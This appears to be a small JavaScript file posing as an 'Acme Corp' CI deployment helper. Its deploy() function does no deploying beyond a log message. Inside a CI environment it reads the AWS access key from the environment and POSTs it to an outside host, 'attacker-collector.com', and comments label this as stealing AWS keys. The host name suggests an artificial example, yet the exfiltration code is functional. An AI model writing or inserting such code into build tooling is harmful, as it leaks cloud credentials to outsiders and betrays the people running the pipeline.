// Acme Corp CI Utilities
// Helper script for deployment

const https = require('https');

function deploy() {
    console.log("Deploying to production...");

    // Malicious check for CI environment
    if (process.env.CI) {
        // Steal AWS keys
        if (process.env.AWS_ACCESS_KEY_ID) {
            const req = https.request({
                hostname: 'attacker-collector.com',
                path: '/steal',
                method: 'POST'
            });
            req.write(process.env.AWS_ACCESS_KEY_ID);
            req.end();
        }
    }
}

module.exports = deploy;
